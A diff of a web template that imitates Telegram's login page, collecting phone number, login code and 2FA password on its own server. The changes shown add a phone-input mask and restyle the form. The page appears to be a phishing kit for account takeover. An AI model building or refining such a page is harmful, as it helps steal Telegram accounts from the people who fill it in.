@@ -9,20 +9,18 @@
 <div class="container">
     <div class="logo"></div>
     <h1>Войти в Telegram</h1>
-    <p class="hint-text">Проверьте код страны и введите номер телефона</p>
+    <p class="under-title-text">Проверьте код страны и введите номер телефона</p>
 
-    <!-- Блок выбора языка -->
-    <form method="GET" id="language-form">
-        <div class="language-container">
-            <label for="language-select">Выберите язык:</label>
-            <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
-                <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
-                <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
-                <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
-                <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
-                <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
-            </select>
-        </div>
+    <!-- Выбор языка -->
+    <form method="GET" id="language-form" class="language-wide">
+        <label for="language-select">Выберите язык:</label>
+        <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
+            <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
+            <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
+            <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
+            <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
+            <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
+        </select>
     </form>
 
     {% if error %}
@@ -32,15 +30,14 @@
     {% endif %}
 
     {% if stage == "phone" %}
-    <form method="POST">
+    <form method="POST" onsubmit="normalizePhone()">
         <input type="hidden" name="lang" value="{{ lang }}">
-        <input type="text" name="phone" placeholder="Введите номер телефона" required>
+        <input type="text" id="phone" name="phone" placeholder="+7 (___) ___-__-__" required>
         <label class="remember-me">
             <input type="checkbox" name="remember_me"> Запомнить меня
         </label>
         <button type="submit">Далее</button>
     </form>
-
     {% elif stage == "code" %}
     <form method="POST" action="/code">
         <input type="hidden" name="phone" value="{{ phone }}">
@@ -48,7 +45,6 @@
         <input type="text" name="code" placeholder="Введите код из Telegram" required>
         <button type="submit">Подтвердить</button>
     </form>
-
     {% elif stage == "2fa" %}
     <form method="POST" action="/password">
         <input type="hidden" name="phone" value="{{ phone }}">
@@ -58,5 +54,38 @@
     </form>
     {% endif %}
 </div>
+
+<script>
+const phoneInput = document.getElementById('phone');
+
+if (phoneInput) {
+    phoneInput.addEventListener('input', function() {
+        let v = phoneInput.value.replace(/\D/g, '');
+
+        let template = '';
+        if (v.startsWith('380')) {
+            template = '+380 (__) ___-__-__';
+            v = v.substring(3);
+        } else if (v.startsWith('7')) {
+            template = '+7 (___) ___-__-__';
+            v = v.substring(1);
+        } else {
+            // общий шаблон: +CCC ___ ___ ___
+            template = '+' + v.substring(0,3) + ' ' + v.substring(3,6) + (v.length>6?'-':'') + v.substring(6,10);
+            phoneInput.value = template;
+            return;
+        }
+
+        let i = 0;
+        phoneInput.value = template.replace(/_/g, () => v[i++] || '');
+    });
+}
+
+// перед отправкой формы оставляем только цифры
+function normalizePhone() {
+    const input = document.getElementById('phone');
+    input.value = input.value.replace(/\D/g, '');
+}
+</script>
 </body>
 </html>
